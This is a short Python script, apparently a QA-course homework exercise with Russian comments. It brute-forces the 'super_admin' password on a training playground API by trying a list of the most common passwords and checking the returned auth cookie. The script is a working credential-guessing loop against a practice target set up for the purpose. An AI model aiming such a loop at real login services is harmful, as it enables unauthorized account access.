import requests

#1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework.
# В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.
#2. Далее эту cookie мы должна передать во второй метод check_auth_cookie.
# Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
# В этом случае берем следующий пароль и все заново.
# Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.

#считаем пароли из файла top_25_most_pass.txt (перенесла с сайта)
#№ год год год год год
#1 --- --- --- --- ---
#2 --- --- --- --- ---
list_pass = []
with open('top_25_most_pass', 'r', encoding='utf-8') as file:
    lines = file.readlines()
    for line in lines[1:]:
        words = line.split()
        list_pass.extend(words[1:])
#print(list_pass)

list_pass_unique = list(dict.fromkeys(list_pass))
#print(list_pass_unique)
for ipass in list_pass_unique:
    params = {"login": "super_admin", "password": ipass}
    respounse = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=params)
    cookies_value = respounse.cookies.get("auth_cookie")
    if cookies_value is not None:
        cookies = {"auth_cookie": cookies_value}
        respounse = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        if respounse.text == "You are authorized":
            print(f"для login: super_admin нашли password: {ipass}")
            break

